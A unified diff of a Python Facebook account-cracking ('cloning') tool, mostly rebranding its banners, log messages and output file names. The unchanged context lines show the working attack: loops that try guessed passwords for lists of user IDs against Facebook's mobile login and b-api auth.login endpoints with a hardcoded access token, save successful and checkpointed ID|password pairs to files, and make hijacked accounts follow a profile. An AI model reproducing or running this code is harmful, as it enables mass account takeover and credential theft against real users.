@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ JUTT ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ YASHIKA💘SAMAR] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ JUTT-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ YASHIKA 💘SAMAR-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ JUTT-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ YASHIKA💘SAMAROK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ JUTT ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ YASHIKA💘SAMAR ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ JUTT-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ YASHIKA-SAMAR-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ JUTT-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ YASHIKA💘 SAMAR-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/JUTT-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/YASHIKA💘SAMAR-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -388,14 +388,15 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m
-__  _____   _____ __  ________ __ ___ 
-\ \/ /   | / ___// / / /  _/ //_//   |
- \  / /| | \__ \/ /_/ // // ,<  / /| |
- / / ___ |___/ / __  // // /| |/ ___ |
-/_/_/  |_/____/_/ /_/___/_/ |_/_/  |_|
-                                      
- 
-__________________****______________________
+  __  __    _       _ ___ ____  
+ |  \/  |  / \     | |_ _|  _ \ 
+ | |\/| | / _ \ _  | || || | | |
+ | |  | |/ ___ \ |_| || || |_| |
+ |_|  |_/_/   \_\___/|___|____/ 
+                                \033
+__________________×______________________
+  TOOL UPDATE AGAIN BY YASHIKA💘SAMAR
+
   Auther   :  MAJID KHAN 💖YASHIKA SARANG
  
   Github   :  MAJID KHAN 💝YASHIKA SARANG 
@@ -405,8 +406,8 @@ __________________****______________________
   TEAM     : TRUSTED HEART SHUTERS 
   
   Contact : +919050966900
-     TOOL UPDATE AGAIN BY YASHIKA SARANG 
-__________________****______________________\033[1;37m""")
+__________________×______________________\033[1;37m""")
+
 class Main:
 	def __init__(self):
 		self.id = []
@@ -443,23 +444,23 @@ class Main:
 			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••𝗠𝗔𝗝𝗜𝗗•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
 			time.sleep(3.0)
 			os.system("clear")
-	print(logo)
-		print("\n [1] File Cloning(BEST)")
-		print(" [2] Public Cloning(ABHI LOL HEY)")
+		print(logo)
+		print("\n [1] File Cloning BEST")
+		print(" [2] Public Cloning")
 		print(" [3] Create File")
-		print(" [4] 2009-10 Cloning(FROOF HEY TU KRO)")
+		print(" [4] 2009-10 Cloning")
 		print(" [5] 2011-14 Cloning")
-		print(" [E] Exit Programming\n")
-		YASHIKA =input(" Choose : ")
-		if YASHIKA in ["1", "01"]:
+		print(" [E] YASHIKA💘SAMAR new tool\n")
+		MAJID =input(" Choose : ")
+		if MAJID in ["1", "01"]:
 			File()
-		if YASHIKA in ["2", "02"]:
+		if MAJID in ["2", "02"]:
 			Public()
-		if YASHIKA in ["3", "03"]:
-			os.system("python YASHIKA.py")
-		if YASHIKA in ["4", "04"]:
+		if MAJID in ["3", "03"]:
+			os.system("python Dump.py")
+		if MAJID in ["4", "04"]:
 			self.old()
-		if YASHIKA in ["5", "05"]:
+		if MAJID in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
@@ -862,7 +863,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ JUTT ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ SAMAR💘YASHIKA] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -879,15 +880,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ YASHIKA💘SAMAR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[SAMAR💘YASHIKA-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-YASHIKA💘SAMAR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SAMAR💘YASHIKA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ YASHIKA💘SAMAR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SAMAR💘YASHIKA-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-YASHIKA💘SAMAR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SAMAR💘YASHIKA-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1289,7 +1290,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ YASHIKA💘SAMAR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [YASHIKA💘SAMAR] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1306,13 +1307,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ YASHIKA💘SAMAR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[YASHIKA💘SAMAR-OK] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-YASHIKA💘SAMAR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ YASHIKA💘SAMAR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[YASHIKA💘SAMAR-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-YASHIKA💘SAMAR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -1339,7 +1340,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m YASHIKA Toll Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m AHAD Toll Paid You Need Get Approved First\033[1;37m\n")
 		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
